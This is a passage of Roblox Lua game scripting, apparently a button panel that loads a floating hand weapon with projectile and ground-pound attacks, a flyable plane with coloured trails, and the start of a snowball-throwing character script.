				PalmLev.maxForce = v3(1/0,1/0,1/0) PalmLev.position =  (t.CFrame *cf(0,12*s,0)).p 
			end 
			if Facing == "Owner" then  
				PalmFace.maxTorque = v3(1/0,1/0,1/0) PalmFace.cframe =  cf(Palm.Position,he.Position) *ca(rd(bgx),rd(bgy),rd(bgz))
			elseif Facing ==  "Mouse" and mou ~= nil and Equip then 
				if Anim.a == "Gun" or Anim.a == "Beam"  or Anim.a == "Ride" or Anim.a == "GroundGrip" or Anim.a == "Fu" or Anim.a ==  "Pound" or Anim.a == "Splat" or Anim.a == "Fist" then 
					if Anim.b == "None" or  Anim.a == "Beam" or Anim.a == "Ride" then 
						PalmFace.cframe =  cf(Palm.Position,mou.Hit.p) *ca(rd(bgx),rd(bgy),rd(bgz)) wait(0.05)
					end end  end
			wait(0.05)
		end 
	end))
	function  FireFinger(lasercol,ffingz,targ,typez,siz,dmg,rndmg,forc)  coroutine.resume(coroutine.create(function() 
			local laser =  pa(m,"Block",fingwide*1.3,fingwide*1.3,fingwide*2.5,true,false,0,0,lasercol)  spm("Sphere",laser,1+(siz/5.5)) laser.Name = "Projectile"
			local lw =  weld(laser,ffingz,laser,0,ffingz.Size.y/0.8 +(siz/2.5),0,rd(90),0,0)
			for  i=1,0.4,-0.05 do laser.Transparency = i wait() end  
			BlastWave(ffingz.CFrame*cf(0,ffingz.Size.y*1.3,0)*ca(0,0,0),ffingz.Size.x*1.6,1.8,LaserCol2)
			lw:Remove()  laser.CFrame = cf(laser.Position,targ)
			Fire(laser,typez,siz,dmg,rndmg,forc)  
		end))
	end
	GrabWeld =  it("Weld",m)
	Palm.Touched:connect(function(touch)
		if Anim.a == "Ride" and  GrabWeld.Part1 == nil and touch.Parent:findFirstChild("Torso") and  touch.Parent:findFirstChild("Humanoid") then
			local tor = touch.Parent.Torso  touch.Parent.Humanoid.PlatformStand = true 
			GrabWeld.Part0 = Palm  GrabWeld.Part1 = tor GrabWeld.C0 = cf(-3*s,4.5*s,-Palm.Size.x/2) GrabWeld.C1 =  ca(0,rd(90),rd(-90)) *ca(0,rd(0),0)
		end
	end)
	re(bp,"Hand")
	hb =  it("HopperBin",bp) hb.Name = "Hand"
	hb.Selected:connect(function(mouse) mou =  mouse Equip = true
		mouse.KeyDown:connect(function(k) k = k:lower()
			if  Anim.a == "Ride" and k == "f" then  FireFinger(LaserCol,pPinkie3,mouse.Hit.p,1,2.25,1,18,30) end
			if Anim.b ~=  "None" or Anim.Welding ~= 0 then return end 
			if Anim.a == "None" then
				if k  == "f" then -- on anim on
					Anim.a = "Gun" HandSign("Gun",0.7)
				elseif k ==  "p" then
					Anim.a = "Fu" HandSign("f",1)
				elseif k == "g" then
					Anim.a =  "Fist" HandSign("fist",1)
				elseif k == "c" then
					Anim.a = "Splat"  HandSign("wide",1)
				elseif k == "r" then
					Anim.a = "Ride" HandSign("ride",1)  Posing = "None"
				elseif k == "v" then
					Anim.a = "Shower" HandSign("grab2",1)  PalmFace.cframe = cf(0,0,0) *ca(0,0,0)
				elseif k == "b" then
					Anim.a =  "Pound" HandSign("fist",1)
				elseif k == "x" then
					Anim.a = "GroundGrip"  HandSign("grab2",1)
				elseif k == "z" then
					Anim.a = "Beam"  HandSign("wide2",1) 
				end 
			else
				if k == "f" and Anim.a == "Gun" then --  on anim off
					Anim.a = "None" HandSign("five",0.8)
				elseif k == "p" and  Anim.a == "Fu" then
					Anim.a = "None" HandSign("five",0.8)
				elseif k == "g"  and Anim.a == "Fist" then
					Anim.a = "None" HandSign("five",0.8)
				elseif k ==  "c" and Anim.a == "Splat" then
					Anim.a = "None" HandSign("five",0.8)
				elseif  k == "r" and Anim.a == "Ride" then
					Anim.a = "None" HandSign("five",0.8)  GrabWeld.Part0 = nil Anim.b = "None" Posing = "Follow" Facing = "Owner"
					if  GrabWeld.Part1 ~= nil and GrabWeld.Part1.Parent:findFirstChild("Humanoid") ~=  nil then GrabWeld.Part1.Parent.Humanoid.PlatformStand = false end GrabWeld.Part1  = nil
				elseif k == "v" and Anim.a == "Shower" then
					Anim.a = "None"  HandSign("five",0.8) Posing = "Follow" Facing = "Owner"
				elseif k == "b" and  Anim.a == "Pound" then
					Anim.a = "None" HandSign("five",0.8)
				elseif k ==  "x" and Anim.a == "GroundGrip" then 
					Anim.a = "None"  HandSign("five",0.8)
				elseif k == "z" and Anim.a == "Beam" then 
					Anim.a =  "None"  HandSign("five",0.8)
				end
			end
		end)
		mouse.Button1Down:connect(function()
			if  Anim.a == "None" or Anim.b ~= "None" then return end 
			if Anim.a == "Gun"  then
				Anim.b = "Gun" FireFinger(LaserCol,pPoint3,mouse.Hit.p,1,2.25,1,10,60)  FireFinger(LaserCol,pMid3,mouse.Hit.p,1,2.25) wait(1) Anim.b = "None"
			elseif  Anim.a == "Fu" then
				Anim.b = "Fu"  FireFinger(LaserCol,pMid3,mouse.Hit.p,1,3.65,2,14,95) wait(0.25) Anim.b =  "None"
			elseif Anim.a == "Fist" then 
				local bhit,bpos =  ray(Palm.Position,Palm.Position - (Palm.CFrame *cf(0,-1,0)).p) 
				if bhit ==  nil or (Palm.Position - bpos).magnitude > 500 then return end 
				Anim.b =  "Fist" Posing = "None" PalmFace.cframe = cf(Palm.Position,bpos)  *ca(rd(-90),0,0)
				PalmLev.position = (Palm.CFrame  *cf(0,-15*s,0)).p
				wait(0.45)
				PalmLev.position = bpos + ((Palm.CFrame  *cf(0,1*s,0)).p - Palm.Position)
				local tz = 0 repeat wait()  BlastWave(Palm.CFrame*ca(rd(180),0,0),8*s,3.5,HCol) tz = tz + wait() until  (PalmLev.position - Palm.Position).magnitude < 8*s or tz >  1
				Explode(Palm.CFrame *cf(0,6*s,0)  *ca(rd(180),0,0),15*s,ts(bhit.BrickColor))
				DmgHumanoidsNear((Palm.CFrame  *cf(0,8,0)).p,3,10,(12*s)+2,105)
				if not bhit.Anchored then PalmLev.position =  (Palm.CFrame *cf(0,12*s,0)).p wait(0.5) end 
				wait(1) Posing = "Follow" Anim.b  = "None"
			elseif Anim.a == "Splat" then
				if mouse.Target == nil and  (Palm.Position - mouse.Hit.p).magnitude > 500 then return end local bpos =  mouse.Hit.p
				Anim.b = "Splat" Posing = "None" 
				local ya,yb,yc =  PalmFace.cframe:toEulerAnglesXYZ() PalmFace.cframe = cf(0,0,0) *ca(0,yb,0)  *ca(rd(-90),0,0) PalmLev.position = bpos + v3(0,10*s,0)
				local tz = 0 repeat  wait() tz = tz + wait() until (PalmLev.position - Palm.Position).magnitude <  5*s or tz > 1.3 
				for i=-90,0,5 do 
					PalmLev.position = PalmLev.position  + v3(0,2*s,0) PalmFace.cframe = cf(0,0,0) *ca(0,yb,0)  *ca(rd(i),0,0)
					wait()
				end wait(0.2)
				for i=0,-100,-10 do 
					local lewd  = i
					if lewd < -50 then lewd = -95 end 
					PalmLev.position =  PalmLev.position - v3(0,4.7*s,0) PalmFace.cframe = cf(0,0,0) *ca(0,yb,0)  *ca(rd(lewd),0,0)
					wait()
				end wait(0.2)
				local cr =  pa(m,"Block",16*s,0,16*s,false,false,1,0,"") cr.Anchored = true cr.CFrame =  cf(bpos) *ca(0,rd(ra(-360,360)),0)
				local de = it("Decal",cr) de.Face = "Top"  de.Texture = asset .. Decs.Crack  Serv.d:AddItem(cr,16)
				DmgHumanoidsNear((Palm.CFrame  *cf(0,0,-1)).p,3,20,(15*s)+2,110)
				ShockWave(Palm.CFrame  *ca(rd(90),0,0),25*s,LaserCol)
				wait(1) Posing = "Follow" Anim.b =  "None"
			elseif Anim.a == "Ride" and Button == false then
				Posing = "None"  Anim.b = "Ride"
				Button = true
				repeat PalmLev.position = (Palm.CFrame  *cf(0,10,0)).p wait() until Button == false
				Anim.b = "None"
			elseif Anim.a  == "Shower" and Button == false then
				Anim.b = "Shower" Button = true  
				repeat
					local targz = Palm.Position + v3(0,20*s,0)
					if ra(1,12) == 1  then FireFinger(LaserCol,pPinkie3,targz,2,4,1,18,55) end
					if ra(1,13) == 1  then FireFinger(LaserCol,pRing3,targz,2,4,1,18,60) end
					if ra(1,12) == 1 then  FireFinger(LaserCol,pMid3,targz,2,4,1,18,65) end
					if ra(1,13) == 1 then  FireFinger(LaserCol,pPoint3,targz,2,4,1,18,70) end
					if ra(1,12) == 1 then  FireFinger(LaserCol,pThumb3,targz,2,4,1,18,80) end
					PalmFace.cframe =  PalmFace.cframe *ca(0,rd(10),0)
					wait()
				until Button == false
				Anim.b =  "None" 
			elseif Anim.a == "Pound" and Anim.b == "None" then Posing = "None"  Anim.b = "Pound"
				local bhit,bpos = ray(Palm.Position,Palm.Position -  (Palm.CFrame *cf(0,-1,0)).p) 
				if bhit == nil or (Palm.Position -  bpos).magnitude > 500 then return end 
				PalmLev.position = bpos +  v3(0,15*s,0) 
				local ya,yb,yc = PalmFace.cframe:toEulerAnglesXYZ()  PalmFace.cframe = ca(ya,yb,yc) 
				local tz = 0 repeat wait() tz = tz + wait()  until (PalmLev.position - Palm.Position).magnitude < 5*s or tz > 1.3  wait(0.1)
				for i=-90,-10,10 do
					PalmFace.cframe = ca(ya,yb,yc)  *ca(0,0,rd(i+90)) PalmLev.position = PalmLev.position + v3(0,2.5*s,0)
					wait()  end wait(0.25) local realcf =  cf(v3(he.Position.x,0,he.Position.z),v3(Palm.Position.x,0,Palm.Position.z))
				for  i=-10,-90,-10 do
					PalmFace.cframe = ca(ya,yb,yc) *ca(0,0,rd(i+90))  PalmLev.position = PalmLev.position - v3(0,4*s,0)
					wait() end PalmFace.cframe  = realcf *ca(rd(-90),rd(90),0) wait(0.25)
				local cr =  pa(m,"Block",22*s,0,22*s,false,false,1,0,"") cr.Anchored = true cr.CFrame =  cf(bpos) *ca(0,rd(ra(-360,360)),0)
				local de = it("Decal",cr) de.Face = "Top"  de.Texture = asset .. Decs.Crack  Serv.d:AddItem(cr,16)
				Dustplosion(Palm.CFrame *cf(2*s,0,0)  *ca(rd(90),0,rd(90)),30*s,{"Really red","Really black","Really  red"},3)
				ShockWave(Palm.CFrame *cf(2*s,0,0)  *ca(rd(90),0,rd(90)),20*s,ts(bhit.BrickColor))
				DmgHumanoidsNear((Palm.CFrame  *cf(0,1,0)).p,1,20,(15*s)+2,90) wait(0.2)
				local palmcf = cf(bpos) local  earthsplos = ra(5,8) palmcf = Palm.CFrame *ca(0,rd(90),0)  *ca(rd(-90),0,rd(0))
				for i=1,earthsplos do Earthsplosion(palmcf  *cf(0,-2*s,((i*7)+7)*s),10,1,20,75) wait(0.1) end 
				Earthsplosion(palmcf  *cf(0,-2*s,(((earthsplos+1)*7)+7)*s),16,2,25,75)
				wait(1) Posing = "Follow"  wait(0.25) Anim.b = "None" 
			elseif Anim.a == "GroundGrip" then Posing =  "None" Anim.b = "GroundGrip"
				local bhit,bpos =  ray(Palm.Position,Palm.Position - (Palm.CFrame *cf(0,-1,0)).p) 
				if bhit ==  nil or (Palm.Position - bpos).magnitude > 500 then return end  
				PalmLev.position = bpos + v3(0,27*s,0) ColFings(false)
				local tz = 0  repeat wait() tz = tz + wait() until (PalmLev.position -  Palm.Position).magnitude < 8*s or tz > 1.3 wait(0.1)
				local thepos =  (Palm.CFrame *cf(0,-0.1*s,0)).p - Palm.Position
				PalmFace.cframe =  cf(Palm.Position,bpos + thepos) *ca(rd(-90),0,0)
				for i=27,1,-3 do  PalmLev.position = bpos + v3(0,i*s,0) wait(0.07) end HandSign("grab3",0.4)  wait(0.55)
				local ro = pa(m,"Ball",0,0,0,false,false,0,0,"Earth green")  ro.Name = "Rock" local row = it("SpecialMesh",ro) row.MeshType = "FileMesh"  row.MeshId = asset .. Decs.Rock
				local rowe =  weld(ro,Palm,ro,0,Palm.Size.y,-Palm.Size.z*1.2,0,0,0) row.Scale =  v3(9*s,10*s,9*s)
				coroutine.resume(coroutine.create(function() for xz=1,70,7  do PalmLev.position = bpos + v3(0,xz*s,0) wait(0.06) end end))
				wait(0.25)  Dustplosion(cf(bpos),30*s,{"Really red","Really black","Really red"},3) local  lolra = ra(-360,360)
				Earthsplosion(cf(bpos),25,1,20,125,"sand") for  yyy=0,360,60 do coroutine.resume(coroutine.create(function()
						for zzz=1,4 do  
							Earthsplosion(cf(bpos) *ca(0,rd(yyy+lolra),0) *cf(0,0,zzz*15*s),10,1,20,75)  wait(0.14)
						end wait(0.25) Earthsplosion(cf(bpos) *ca(0,rd(yyy+lolra),0)  *cf(0,0,5*18*s),25,1,20,120) end)) end 
				wait(0.3) HandSign("grab2",0.5)  wait(0.75) Serv.d:AddItem(ro,20) rowe:Remove() ro.CanCollide = true local rocf =  ro.CFrame ro.Size=v3(14*s,14*s,14*s) ro.CFrame = rocf wait(0.75) ColFings(true)  Posing = "Follow" Anim.b = "None" 
			elseif Anim.a == "Beam" and not Button and  Anim.b == "None" then Anim.b = "Beam" 
				ShortifiedAnim("Beam") wait(0.5)  Anim.b = "None"
			end
		end)
		mouse.Button1Up:connect(function()
			Button =  false
		end)
		mouse.Move:connect(function()  
		end)

	end)
	hb.Deselected:connect(function(mouse)
		Equip =  false
	end)




end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Plane"
button.Position = UDim2.new(0.5,3,0,132)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Plane"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	repeat wait() until game:IsLoaded() and game:service("Players").LocalPlayer.Character ~= nil;
	wait(0.4) 
	for i, v in pairs(game:service("Players").LocalPlayer.Character:children()) do 
		if v ~= script then 
			v:Destroy() 
		end 
	end 

	local player = game:service("Players").LocalPlayer
	local mouse = player:GetMouse() 
	local cam = workspace.CurrentCamera 
	local char = player.Character 
	local Torsoz = char:findFirstChild("Torso") 
	local NV = Vector3.new() 
	local Main 
	local W,S = false,false 
	local DoublePress = {nil,0} 
	script.Parent = char 

	local TrailParts = {} 
	local Acceleration = 0.08 
	local Speed = 0 
	local MinSpeed = 0 
	local MaxSpeed = 3.2 
	local DesiredDirection = cam.CoordinateFrame.lookVector 
	local Direction = DesiredDirection 
	local Roll = 0 
	local AllowTrails = true 

	script.Name = "AdvFlight" 

	local P = Instance.new("Part") 
	P.Anchored = true 
	P.CanCollide = false 
	P.Name = "Part" 
	P.formFactor = "Custom" 
	P.Size = Vector3.new(0.2,0.2,0.2) 
	P.Locked = true 
	P.TopSurface = 10 
	P.BottomSurface = 10 
	P.FrontSurface = 10 
	P.BackSurface = 10 
	P.LeftSurface = 10 
	P.RightSurface = 10 
	P.Material = "Pebble" 
	P.BrickColor = BrickColor.new("White") 

	local shipp 
	local shadow 
	local campart 

	function RAY(pos, dir, startpos, endpos, distleft, collidedlist) 
		collidedlist = collidedlist or {char} 
		startpos = startpos or pos 
		distleft = distleft or dir.unit * dir.magnitude 
		endpos = endpos or pos + distleft 
		local ray = Ray.new(pos, distleft) 
		local hitz,enz = workspace:FindPartOnRayWithIgnoreList(ray, collidedlist) 
		if hitz ~= nil then 
			if hitz.CanCollide == false then 
				table.insert(collidedlist, hitz) 
				local newpos = enz 
				local newdistleft = distleft - (dir.unit * (pos - newpos).magnitude) 
				if newdistleft ~= NV then 
					return RAY(newpos-(dir*0.01), dir, startpos, endpos, newdistleft+(dir*0.01), collidedlist) 
				end 
			end 
		end 
		return hitz, enz, ray 
	end 

	function FindSurface(part, position) 
		local obj = part.CFrame:pointToObjectSpace(position) 
		local siz = part.Size/2 
		for i,v in pairs(Enum.NormalId:GetEnumItems()) do 
			local vec = Vector3.FromNormalId(v) 
			local wvec = part.CFrame:vectorToWorldSpace(vec) 
			local vz = (obj)/(siz*vec) 
			if (math.abs(vz.X-1) < 0.01 or math.abs(vz.Y-1) < 0.01 or math.abs(vz.Z-1) < 0.01) then
				return wvec,vec 
			end 
		end 
		if part.className == "WedgePart" then 
			return part.CFrame:vectorToWorldSpace(Vector3.new(0,0.707,-0.707)), Vector3.new(0,0.707,-0.707) 
		end 
	end 

	function HSV(H,S,V) 
		H = H % 360 
		local C = V * S 
		local H2 = H/60 
		local X = C * (1 - math.abs((H2 %2) -1)) 
		local color = Color3.new(0,0,0) 
		if H2 <= 0 then 
			color = Color3.new(C,0,0) 
		elseif 0 <= H2 and H2 <= 1 then 
			color = Color3.new(C,X,0) 
		elseif 1 <= H2 and H2 <= 2 then 
			color = Color3.new(X,C,0) 
		elseif 2 <= H2 and H2 <= 3 then 
			color = Color3.new(0,C,X) 
		elseif 3 <= H2 and H2 <= 4 then 
			color = Color3.new(0,X,C) 
		elseif 4 <= H2 and H2 <= 5 then 
			color = Color3.new(X,0,C) 
		elseif 5 <= H2 and H2 <= 6 then 
			color = Color3.new(C,0,X) 
		end 
		local m = V - C
		return Color3.new(color.r + m, color.g + m, color.b + m) 
	end 

	function Build(shiptype) 
		AllowTrails = true 
		for i, v in pairs(char:children()) do 
			if v.className == "Model" and v.Name == "Ship" then 
				v:remove() 
			end 
		end 
		for i, v in pairs(TrailParts) do 
			for _,V in pairs(v[3]) do 
				V:Destroy() 
			end 
		end 
		local mdl = Instance.new("Model", char) 
		mdl.Name = "Ship" 

		------------------------ Speeder Ship Type -----------------------------
		if shiptype == "Speeder" then 

			shipp = P:Clone() 
			shipp.Parent = mdl 
			shipp.Size = Vector3.new(1,1,2.2) 
			local shipwing1 = P:Clone() 
			shipwing1.Parent = mdl 
			shipwing1.Size = Vector3.new(0.6,1.2,2) 
			local mesh = Instance.new("SpecialMesh", shipwing1) 
			mesh.MeshType = "Wedge" 
			local shipwing2 = shipwing1:Clone() 
			shipwing2.Parent = mdl 
			campart = P:Clone() 
			campart.Transparency = 1 
			local shipwing21 = P:Clone() 
			shipwing21.Parent = mdl 
			shipwing21.Size = Vector3.new(0.32,1.1,2.6) 
			local mesh = Instance.new("SpecialMesh", shipwing21) 
			mesh.MeshType = "Wedge" 
			local shipwing22 = shipwing21:Clone() 
			shipwing22.Parent = mdl 
			campart = P:Clone() 
			campart.Transparency = 1 

			local shipwi = P:Clone() 
			shipwi.Parent = mdl 
			shipwi.Size = Vector3.new(1,1,1.2) 
			local mesh = Instance.new("SpecialMesh", shipwi) 
			mesh.MeshType = "Wedge" 
			local shipwi2 = P:Clone() 
			shipwi2.Parent = mdl 
			shipwi2.Size = Vector3.new(0.7,0.7,0.84) 
			shipwi2.Material = "SmoothPlastic" 
			shipwi2.BrickColor = BrickColor.new("Pastel blue") 
			shipwi2.Reflectance = 0.6 
			local mesh = Instance.new("SpecialMesh", shipwi2) 
			mesh.MeshType = "Wedge" 

			shadow = P:Clone() 
			shadow.Parent = mdl 
			shadow.Name = "Shadow" 
			shadow.Material = "SmoothPlastic" 
			shadow.BrickColor = BrickColor.new("Really black") 
			local mesh = Instance.new("SpecialMesh",shadow) 
			mesh.MeshType = "Sphere" 

			TrailParts = {} 
			table.insert(TrailParts,{shipp,1,{},cam.CoordinateFrame.p,CFrame.new(0,0,1),0.5,18}) 
			table.insert(TrailParts,{shipwing1,1,{},cam.CoordinateFrame.p,CFrame.new(0,0.45,1),0.3,15}) 
			table.insert(TrailParts,{shipwing2,1,{},cam.CoordinateFrame.p,CFrame.new(0,0.45,1),0.3,15}) 
			for _, V in pairs(TrailParts) do 
				for i = 1, V[7] do 
					local p = P:Clone() 
					local mesh = Instance.new("SpecialMesh", p) 
					mesh.MeshId = "http://www.roblox.com/asset/?id=9856898" 
					mesh.TextureId = "http://www.roblox.com/asset/?id=48358980" 
					p.BrickColor = BrickColor.new("Dark stone grey") 
					table.insert(V[3],p) 
				end 
			end 

			function ReposParts() 
				shipwing1.CFrame = shipp.CFrame * CFrame.new(-1.1,-0.195,-0.14) * CFrame.Angles(0,0,math.pi/2) 
				shipwing2.CFrame = shipp.CFrame * CFrame.new(1.1,-0.195,-0.14) * CFrame.Angles(0,0,-math.pi/2) 
				shipwing21.CFrame = shipp.CFrame * CFrame.new(-1.05,-0.34,-0.45) * CFrame.Angles(0,0,math.pi/2) 
				shipwing22.CFrame = shipp.CFrame * CFrame.new(1.05,-0.34,-0.45) * CFrame.Angles(0,0,-math.pi/2) 
				shipwi.CFrame = shipp.CFrame * CFrame.new(0,0,-1.7) 
				shipwi2.CFrame = shipwi.CFrame * CFrame.new(0,0.015,-0.015) 
				campart.CFrame = shipp.CFrame + Vector3.new(0,1.5,0) 
			end 
			cam.CameraSubject = campart 
			cam.CameraType = "Track" 

			shipp.CFrame = CFrame.new(NV,Direction) + cam.CoordinateFrame.p 
			ReposParts() 

		end 

		AllowTrails = true 
	end 
	Build("Speeder") 

	function B1D() 
		Build("Speeder") 
	end 

	function RollThatSht(direc) 
		if Roll == 0 then 
			for i = 1, 50 do 
				Roll = (-360 + math.cos(math.pi/50*i) * 360) * direc 
				wait(0.02) 
			end 
			Roll = 0 
		end 
	end 

	function KD(key) 
		if key == "w" then 
			W = true 
		elseif key == "s" then 
			S = true 
		end 

		local rollpls = 0 
		if key == DoublePress[1] and tick() - DoublePress[2] < 0.32 then 
			DoublePress = {nil,0} 
			if key == "a" then 
				rollpls = -1 
			elseif key == "d" then 
				rollpls = 1 
			end 
		end 

		DoublePress = {key,tick()} 
		if rollpls ~= 0 then 
			RollThatSht(rollpls) 
		end 
	end 

	function KU(key) 
		if key == "w" then 
			W = false 
		elseif key == "s" then 
			S = false 
		end 
	end 

	function Equip() 
	end 

	function Unequip() 
	end 

	mouse.Icon = "rbxasset://textures\\GunCursor.png" 
	mouse.Button1Down:connect(B1D) 
	mouse.KeyDown:connect(KD) 
	mouse.KeyUp:connect(KU) 



	local count = 0 
	local hue = 0 
	--game:GetService("RunService").Stepped:connect(function() 
	while wait(0.02) do 

		------ Speed --------
		local valu = (0.002*MaxSpeed) + ((Speed/MaxSpeed)*Acceleration)
		if W == true then 
			Speed = Speed + valu 
		elseif S == true then 
			Speed = Speed - valu 
		end 
		if Speed > MaxSpeed then 
			Speed = MaxSpeed 
		elseif Speed < MinSpeed then 
			Speed = MinSpeed 
		end 

		------ left/right tilt ---------
		local target = 180 + math.floor(math.deg(math.atan2(DesiredDirection.x,DesiredDirection.z))) 
		local current = 180 + math.floor(math.deg(math.atan2(Direction.x,Direction.z))) 
		local swing = 0 
		if math.abs(math.abs(current-target) - 360) > math.abs(target-current) then 
			swing = target-current 
		else 
			swing = (current > target and -(math.abs(current-target) - 360)) or (current < target and math.abs(current-target) - 360) 
		end 

		DesiredDirection = cam.CoordinateFrame.lookVector 
		------ direction smoothening ------ 
		local dir = DesiredDirection.unit 
		if Direction ~= dir then 
			if (Direction - dir).magnitude < 0.01 then 
				Direction = dir 
			else 
				local dist = ((dir - Direction).unit * (dir - Direction).magnitude) /10 
				Direction = (Direction + dist).unit 
			end 
		end 

		shipp.CFrame = (CFrame.new(NV,Direction) + shipp.Position + (Direction.unit * Speed)) * CFrame.Angles(0,0,math.rad(Roll) + math.rad(swing/2)) 
		ReposParts() 

		------ shadow ------
		local ghitz, genz = RAY(shipp.Position,Vector3.new(0,-26,0)) 
		local angles = CFrame.new() 
		if ghitz ~= nil and ghitz.className ~= "Terrain" and ((ghitz.className == "Part" and ghitz.Shape == Enum.PartType.Block) or (ghitz.className ~= "Part" and ghitz:IsA("BasePart"))) then 
			local wvec,vec = FindSurface(ghitz,genz) 
			angles = CFrame.new(NV,wvec) * CFrame.Angles(-math.pi/2,0,0) 
		elseif ghitz ~= nil and (ghitz.className == "Part" and ghitz.Shape == Enum.PartType.Ball) then 
			angles = (CFrame.new(ghitz.Position, genz) - ghitz.Position) * CFrame.Angles(-math.pi/2,0,0) 
		end 
		shadow.CFrame = CFrame.new(genz) * angles 
		shadow.Transparency = 0.5 + (((shipp.Position - genz).magnitude /26)*0.5)
		shadow.Mesh.Scale = (Vector3.new(4.4,0.25,4.4) * 5) * (1-(shipp.Position - genz).magnitude /26)

		------- Trails ----------------------- 
		if AllowTrails == true then 
			count = (count+1)%1 
			hue = (hue+1) % 360
			local rgb = HSV(hue,0.65,0.85) 
			for _,v in pairs(TrailParts) do 
				local to = (v[1].CFrame * v[5]).p
				if Speed > MinSpeed + 0.2 then 
					v[2] = (v[2]%#v[3]) + 1 
					v[3][v[2]].CFrame = CFrame.new((v[4] + to)/2,to) * CFrame.Angles(math.pi/2,math.rad(Roll) + math.rad(swing/2),0) 
					v[3][v[2]].Mesh.Scale = Vector3.new(v[6],(v[4] - to).magnitude*2,v[6]) 
					v[3][v[2]].Mesh.VertexColor = Vector3.new(rgb.r,rgb.g,rgb.b) 
					v[3][v[2]].Transparency = 0.15 
					v[3][v[2]].Parent = game.Players.LocalPlayer.Character
				else 
					v[2] = (v[2]%#v[3]) + 1 
					v[3][v[2]].Parent = nil 
				end 

				v[4] = to 
			end 
		end 

	end 
	--end) 

	-- 138098590 -- plane destroyed sound 
	-- 133082569 -- propeller 2 
	-- 135645246 -- propeller 1 
--[[ Possible Game names 
Aeroscape
Airbound
Aerialtude
]]
end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Snowball"
button.Position = UDim2.new(0,0,0,165)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Snowball"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	repeat wait() until game:GetService("Players").LocalPlayer.Character ~= nil;
	wait(0.5)

	S = Instance.new("Model")
	S.Name = "ValueChanger1"
	S.Parent = Game.Workspace
	--- vars ---
	local player = game:GetService("Players").LocalPlayer
	local repstor = game:GetService("ReplicatedStorage") 
	local mouse = player:GetMouse() 
	local char = player.Character 
	local Hu = char.Humanoid 
	local Gui = player:WaitForChild("PlayerGui") 
	local Torsoz = char:findFirstChild("Torso") 
	local HRP = char:findFirstChild("HumanoidRootPart") 
	local HRJ = HRP:findFirstChild("RootJoint") 
	local RA = char:findFirstChild("Right Arm") 
	local LA = char:findFirstChild("Left Arm") 
	local RL = char:findFirstChild("Right Leg") 
	local LL = char:findFirstChild("Left Leg") 
	local H = char:findFirstChild("Head") 
	local RS = Torsoz:findFirstChild("Right Shoulder") 
	local LS = Torsoz:findFirstChild("Left Shoulder") 
	local RH = Torsoz:findFirstChild("Right Hip") 
	local LH = Torsoz:findFirstChild("Left Hip") 
	local N = Torsoz:findFirstChild("Neck") 
	local NV = Vector3.new() 
	local Main 
	local SPB,SPF,SPC,SnowPart 
	local SPCP = 0 
	local Animating = false 
	local Walkspeed = 16 
	local Shift, Alt, Space, MouseDown = false, false, false, false 
	local ThrowingSequence = false 
	local SlideCooldown = 0 
	local SnowballProjectiles, SnowSplosionEffects = {}, {} 
	local disableJump = false 

	local AnimSpeeds = {
		0.5; -- idle
		5; -- walking 
		6.5; -- running 
		7; -- jumping 
		7; -- falling
	}  

	for i, v in pairs(char:children()) do 
		if v.Name == "Cheese" then 
			v:remove() 
		end 
	end 
	script.Parent = char 
	script.Name = "Cheese" 

	------------ animation funcs & other things ---------------
	local P = Instance.new("Part") 
	P.Anchored = false 
	P.CanCollide = false 
	P.Name = "Part" 
	P.formFactor = "Custom" 
	P.Size = Vector3.new(0.2,0.2,0.2) 
	P.Locked = true 
	P.TopSurface = 10 
	P.BottomSurface = 10 
	P.FrontSurface = 10 
	P.BackSurface = 10 
	P.LeftSurface = 10 
	P.RightSurface = 10 

	function GetWeld(weld) 
		if weld:findFirstChild("WeldAngle") == nil then 
			local a = Instance.new("Vector3Value", weld) 
			a.Name = "WeldAngle" 
		end 
		return weld.C0.p, weld.WeldAngle.Value 
	end 

	function SetWeld(weld, i, loops, origpos,origangle, nextpos,nextangle,smooth) 
		smooth = smooth or 1 
		if weld:findFirstChild("WeldAngle") == nil then 
			local a = Instance.new("Vector3Value", weld) 
			a.Name = "WeldAngle" 
		end 

		local perc = (smooth == 1 and math.sin((math.pi/2)/loops*i)) or i/loops 

		local tox,toy,toz = 0,0,0 
		tox = math.abs(origangle.x - nextangle.x) *perc 
		toy = math.abs(origangle.y - nextangle.y) *perc 
		toz = math.abs(origangle.z - nextangle.z) *perc 
		tox = (origangle.x > nextangle.x and -tox) or tox 
		toy = (origangle.y > nextangle.y and -toy) or toy 
		toz = (origangle.z > nextangle.z and -toz) or toz 

		local tox2,toy2,toz2 = 0,0,0 
		tox2 = math.abs(origpos.x - nextpos.x) *perc 
		toy2 = math.abs(origpos.y - nextpos.y) *perc 
		toz2 = math.abs(origpos.z - nextpos.z) *perc 
		tox2 = (origpos.x > nextpos.x and -tox2) or tox2 
		toy2 = (origpos.y > nextpos.y and -toy2) or toy2 
		toz2 = (origpos.z > nextpos.z and -toz2) or toz2 

		weld.WeldAngle.Value = Vector3.new(origangle.x + tox, origangle.y + toy, origangle.z + toz) 
		weld.C0 = CFrame.new(origpos.x + tox2,origpos.y + toy2,origpos.z + toz2) * CFrame.Angles(origangle.x + tox,origangle.y + toy,origangle.z + toz) 
	end 

	function RAY(pos, dir, startpos, endpos, distleft, collidedlist) 
		collidedlist = collidedlist or {char} 
		startpos = startpos or pos 
		distleft = distleft or dir.unit * dir.magnitude 
		endpos = endpos or pos + distleft 
		local ray = Ray.new(pos, distleft) 
		local hitz,enz = workspace:FindPartOnRayWithIgnoreList(ray, collidedlist) 
		if hitz ~= nil then 
			if hitz.CanCollide == false then 
				table.insert(collidedlist, hitz) 
				local newpos = enz 
				local newdistleft = distleft - (dir.unit * (pos - newpos).magnitude) 
				if newdistleft ~= NV then 
					return RAY(newpos-(dir*0.01), dir, startpos, endpos, newdistleft+(dir*0.01), collidedlist) 
				end 
			end 
		end 
		return hitz, enz, ray 
	end 

	function ChangeValue(obj,type,value) 
		local val = Instance.new("ObjectValue") 
		val.Name = type 
